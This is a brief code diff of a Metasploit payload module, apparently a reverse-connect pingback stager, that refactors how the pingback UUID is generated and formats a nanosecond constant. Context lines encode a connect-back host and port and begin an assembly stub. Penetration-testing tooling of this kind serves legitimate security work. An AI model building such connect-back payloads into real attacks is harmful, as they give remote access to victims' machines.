@@ -36,11 +36,11 @@ module MetasploitModule
       encoded_host_port = "0x%.8x%.8x" % [encoded_host, encoded_port]
       retry_count = [datastore['ReverseConnectRetries'].to_i, 1].max
 
-      pingback_uuid ||= generate_pingback_uuid
-      uuid_as_db = "0x" + pingback_uuid.to_s.gsub("-", "").chars.each_slice(2).map(&:join).join(",0x")
+      self.pingback_uuid ||= self.generate_pingback_uuid
+      uuid_as_db = "0x" + self.pingback_uuid.chars.each_slice(2).map(&:join).join(",0x")
       seconds = 5.0
       sleep_seconds = seconds.to_i
-      sleep_nanoseconds = (seconds % 1 * 1000000000).to_i
+      sleep_nanoseconds = (seconds % 1 * 1_000_000_000).to_i
 
       asm = %Q^
         push   #{retry_count}        ; retry counter
